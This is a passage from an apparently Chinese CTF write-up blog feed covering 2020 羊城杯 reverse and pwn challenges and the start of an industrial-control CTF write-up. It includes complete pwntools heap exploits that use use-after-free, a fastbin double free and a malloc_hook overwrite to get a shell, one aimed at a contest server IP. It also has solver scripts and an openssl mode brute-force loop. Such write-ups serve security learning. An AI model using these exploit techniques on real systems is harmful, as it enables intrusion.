25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)if s.check() == sat:    result = s.model()    print result'''</span><span class="hljs-string">'''[a2 = 24, a13 = 88, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a12 = 74, a7 = 28, a1 = 119, a10 = 108, a11 = 88, a8 = 91, a4 = 7, a3 = 10]'''</span>key = [<span class="hljs-number">10</span>,<span class="hljs-number">24</span>,<span class="hljs-number">119</span>,<span class="hljs-number">7</span>,<span class="hljs-number">104</span>,<span class="hljs-number">43</span>,<span class="hljs-number">28</span>,<span class="hljs-number">91</span>,<span class="hljs-number">108</span>,<span class="hljs-number">52</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">88</span>,<span class="hljs-number">33</span>]flag = <span class="hljs-string">' '</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>):    key[i<span class="hljs-number">-1</span>] = key[i] ^ key[i - <span class="hljs-number">1</span>]    flag += chr(key[i<span class="hljs-number">-1</span>])flag = flag[::<span class="hljs-number">-1</span>]flag += chr(<span class="hljs-number">33</span>)print(flag)</code></pre></div><p>其中在z3中处理逻辑运算时，是很特殊的，这个需要注意，具体可以看z3的官方文档。<br>可以参考：<br><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" target="_blank" rel="noopener">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p><p>还有遇到逻辑左移右移：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-number">1.</span> “&gt;&gt;”int x = <span class="hljs-number">16</span>; printf(<span class="hljs-string">"%d\n"</span>, x &gt;&gt; <span class="hljs-number">1</span>);先将x转成二进制 <span class="hljs-number">10000</span>, 不读最后一位， 输出 <span class="hljs-number">1000</span>， 即为<span class="hljs-number">8</span>;右移一位相当于数值除以<span class="hljs-number">2</span><span class="hljs-number">2.</span> “&lt;&lt;”int x = <span class="hljs-number">16</span>; printf(<span class="hljs-string">"%d\n"</span>, x &lt;&lt; <span class="hljs-number">1</span>);先将x转成二进制 <span class="hljs-number">10000</span>, 往最后再读取一位(<span class="hljs-number">0</span>, 或根据是否已经有移位)， 输出 <span class="hljs-number">100000</span>， 即为<span class="hljs-number">32</span>;左移，若移动位数K等于或大于数据长度N,通常只移动K mod N 位数左移一位相当于数值乘以<span class="hljs-number">2</span></code></pre></div><p>在这里是左移7，也就是乘 2 的7次方。</p><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>3层加密.</p><ul><li>一个base64</li><li>一个以13字节，分割字符，进行移位</li><li>单字节凯撒加密，但是也加入了对数字的处理</li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64key = <span class="hljs-string">'EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG'</span>key = [ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]buf = [<span class="hljs-number">0</span>]*<span class="hljs-number">52</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">64</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">90</span>:        buf[i] = (key[i] - <span class="hljs-number">65</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">96</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">122</span>:        buf[i] =  (key[i] - <span class="hljs-number">97</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">0x61</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">47</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">57</span>:        buf[i] = (key[i] - <span class="hljs-number">48</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">10</span> + <span class="hljs-number">48</span>        <span class="hljs-keyword">continue</span>    buf[i] = key[i]buf = [chr(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> buf]key2 = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> buf:    key2 += ikey2 = key2[<span class="hljs-number">13</span>:<span class="hljs-number">26</span>] + key2[<span class="hljs-number">39</span>:<span class="hljs-number">52</span>] + key2[:<span class="hljs-number">13</span>] + key2[<span class="hljs-number">26</span>:<span class="hljs-number">39</span>]flag = base64.b64decode(key2)print(flag)</code></pre></div><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="sing-in"><a href="#sing-in" class="headerlink" title="sing in"></a>sing in</h3><p>入门堆题，存在uaf，进行<code>fastbin attcak</code>即可。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10029</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,mes)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(name))    sla(<span class="hljs-string">'mes'</span>,str(mes))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'index:'</span>,str(idx))payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x60</span>mes = <span class="hljs-string">'b'</span> * <span class="hljs-number">23</span>add(<span class="hljs-number">0x100</span>,payload,mes)add(<span class="hljs-number">0x60</span>,payload,mes)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>,mes)show()ru(<span class="hljs-string">"Game[2]'s name :"</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b20</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)malloc_hook = libc_base + <span class="hljs-number">0x3c4aed</span>add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))one = <span class="hljs-number">0x4527a</span> + libc_basepayload = <span class="hljs-string">'1'</span> * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0</span>) + p64(one)add(<span class="hljs-number">0x60</span>,payload,payload)itr()</code></pre></div><p>其中可以申请一个堆，进行getshell，也可以同时2次free同一个chunk，触发报错函数，而调用报错函数的时候又会用到<code>malloc_hook</code>，从而getshell。</p><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul><li>只有add和del功能</li><li>存在uaf</li><li>只能申请&lt;0x70的堆块</li></ul><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><p>需要利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列。</p><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/176139" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139</a></p><p><a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p><p><code>malloc_consolidate</code>具体步骤如下：</p><ol><li>判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。</li><li>按照fastbin由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。</li><li>首先尝试合并<code>pre_chunk</code>。</li><li>然后尝试合并<code>next_chunk</code>：如果<code>next_chunk</code>是<code>top_chunk</code>，则直接合并到<code>top_chunk</code>，然后进行第六步；如果<code>next_chunk</code>不是<code>top_chunk</code>，尝试合并。</li><li>将处理完的chunk插入到unsorted bin头部。</li><li>获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。</li></ol><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列，在堆上留下libc的相关地址</li><li>利用fastbin attack ，打<code>__IO_2_1_stdout</code>，泄漏libc</li><li>利用fastbin attack ，打<code>malloc_hook</code></li></ul><p>难点在申请堆块的数量,题目限制了19个，是刚刚够用。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,mes)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">"game's name:"</span>,str(name))    sla(<span class="hljs-string">'mes'</span>,str(mes))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index:'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x28</span>    mes = <span class="hljs-string">'2'</span> * <span class="hljs-number">23</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#2</span>    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#3</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#4</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#5</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#6</span>    free(<span class="hljs-number">3</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">5</span>)    <span class="hljs-comment"># debug()</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)    sl(<span class="hljs-string">'1'</span>*<span class="hljs-number">0x500</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0xb5dd</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#7</span>    add(<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0xb5dd</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#8</span>    free(<span class="hljs-number">6</span>)    free(<span class="hljs-number">7</span>)    free(<span class="hljs-number">6</span>)    add(<span class="hljs-number">0x68</span>,p8(<span class="hljs-number">0x90</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#9</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#10</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#11</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#12</span>    payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'104'</span>) <span class="hljs-comment">#13</span>    sa(<span class="hljs-string">'name'</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./pwn'</span>)        <span class="hljs-comment"># io = remote('39.101.184.181',10000)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)ru(<span class="hljs-string">'age'</span>)sl(<span class="hljs-string">'1'</span>)free(<span class="hljs-number">10</span>)free(<span class="hljs-number">11</span>)free(<span class="hljs-number">10</span>)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_addradd(<span class="hljs-number">0x68</span>,p64(malloc_hook),<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>)one_rec = <span class="hljs-number">0xf0364</span> + libc_addrpayload = <span class="hljs-string">'1'</span> * (<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>)+ p64(one_rec)add(<span class="hljs-number">0x68</span>,payload,<span class="hljs-string">'1'</span>)free(<span class="hljs-number">6</span>)free(<span class="hljs-number">6</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;羊城杯2020部分wp&quot;&gt;&lt;a href=&quot;#羊城杯2020部分wp&quot; class=&quot;headerlink&quot; title=&quot;羊城杯2020部分wp&quot;&gt;&lt;/a&gt;羊城杯2020部分wp&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a href=&quot;#re&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020 “中能融合杯” 部分wp</title>
    <link href="http://chumen77.xyz/2020/09/12/2020%20%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%20%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/12/2020 “中能融合杯” 部分wp/</id>
    <published>2020-09-12T09:15:09.106Z</published>
    <updated>2020-09-17T09:36:44.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工控wp"><a href="#工控wp" class="headerlink" title="工控wp"></a>工控wp</h1><h2 id="ICS-8"><a href="#ICS-8" class="headerlink" title="ICS_8"></a><code>ICS_8</code></h2><p>就是一个算法的逆向。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> base64cypher_text = <span class="hljs-string">'HgoAVxEfdCRlPytBA1JSHiVOZW4VMURPcANETw=='</span>iv = struct.unpack(<span class="hljs-string">"I"</span>, <span class="hljs-string">'x1a0'</span>)[<span class="hljs-number">0</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(cypher_text,iv)</span>:</span>    cypher_text = base64.b64decode(cypher_text)    padding = <span class="hljs-number">4</span> - len(cypher_text) % <span class="hljs-number">4</span>    <span class="hljs-keyword">if</span> padding != <span class="hljs-number">0</span>:        cypher_text = cypher_text + <span class="hljs-string">"\x00"</span> * padding    l = cypher_text    crypher = struct.unpack(<span class="hljs-string">"I"</span>*(len(l)/<span class="hljs-number">4</span>),l)    datas = []    datas += [ decrypto(crypher[<span class="hljs-number">0</span>]) ^ iv ]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,len(crypher)):        datas += [decrypto(crypher[i]) ^ crypher[i<span class="hljs-number">-1</span>]]    <span class="hljs-keyword">return</span> datas<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypto</span><span class="hljs-params">(data)</span>:</span>    <span class="hljs-keyword">return</span> data ^ (data &gt;&gt; <span class="hljs-number">16</span>)datas = decode(cypher_text,iv)flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> datas:    flag += struct.pack(<span class="hljs-string">"I"</span>,i)<span class="hljs-keyword">print</span> flag</code></pre></div><h2 id="ICS-9"><a href="#ICS-9" class="headerlink" title="ICS_9"></a><code>ICS_9</code></h2><p>解压以后是一个img，但是发现是损坏的。</p><div class="hljs"><pre><code class="hljs bash">file ./ICS_9.img./ICS_9.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files)</code></pre></div><p>可以看到是ext4的文件。<br>然后可以用fsck修复一下：</p><div class="hljs"><pre><code class="hljs bash"> fsck.ext4 ./ICS_9.imge2fsck 1.42.13 (17-May-2015)ext2fs_open2: The ext2 superblock is corruptfsck.ext4: Superblock invalid, trying backup blocks..../ICS_9.img was not cleanly unmounted, check forced.Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary informationFree blocks count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#0 (6789, counted=488).</span>Fix&lt;y&gt;? yesFree blocks count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#1 (2006, counted=228).</span>Fix&lt;y&gt;? yesFree blocks count wrong (8795, counted=716).Fix&lt;y&gt;? yesFree inodes count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#0 (1269, counted=1262).</span>Fix&lt;y&gt;? yesFree inodes count wrong (2549, counted=2542).Fix&lt;y&gt;? yes./ICS_9.img: ***** FILE SYSTEM WAS MODIFIED *****./ICS_9.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/kfnyiY.png" srcset="/img/loading.gif" alt></p><p>然后进行挂载:</p><div class="hljs"><pre><code class="hljs bash">mkdir tmp2sudo mount ICS_9.img tmp2 ; ls -larth tmp2</code></pre></div><div class="hljs"><pre><code class="hljs bash"> binwalk fil.encScan Time:     2015-03-09 15:35:08Target File:   /tmp/wu/tmp/fil.encMD5 Checksum:  cb84f2cc7d776e83ebe0bd17efa163f4Signatures:    328DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12Ecat AE54[71A3j9[\22?/+u0</code></pre></div><p>Binwalk 一下，发现enc文件是openssl加密的文件，AE5文件是关于加密算法和密钥。</p><p>但是并不知道是哪种模式的加密和密钥的长度的加密，需要写一个脚本测试。<br>这是所有的可能：</p><div class="hljs"><pre><code class="hljs bash">-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192</code></pre></div><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash  </span> KEY=`cat AE5`   AES=<span class="hljs-string">"-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192"</span>   <span class="hljs-keyword">for</span> mode <span class="hljs-keyword">in</span> <span class="hljs-variable">$AES</span>   <span class="hljs-keyword">do</span>        openssl enc -d -<span class="hljs-keyword">in</span> fil.enc -out ./tmp3/fil<span class="hljs-string">"<span class="hljs-variable">$mode</span>"</span>.dec -k <span class="hljs-variable">$KEY</span> <span class="hljs-variable">$mode</span>   <span class="hljs-keyword">done</span></code></pre></div><div class="hljs"><pre><code class="hljs bash">sudo chmod +x ./1.shsudo sh 1.sh</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/X2q45Z.png" srcset="/img/loading.gif" alt></p><h2 id="ICS-11"><a href="#ICS-11" class="headerlink" title="ICS_11"></a><code>ICS_11</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/UypJgM.png" srcset="/img/loading.gif" alt><br>程序上来就告诉一下flag的格式，其中字符的内容是20位。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SzWq5u.png" srcset="/img/loading.gif" alt><br>向下走，也会发现有20的相关判断。<br>其上方有个大小判断大于10就退出了，但是flag是20位的，明显需要patch一下：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/6BsYEl.png" srcset="/img/loading.gif" alt></p><p>然后往下分析，发现你输入的东西会跟12位的<code>nemo_pwned_n</code>进行先比较一下，<br>接着:</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> ( v17 + v18 != 2842152358 || v18 - v17 != 989791556 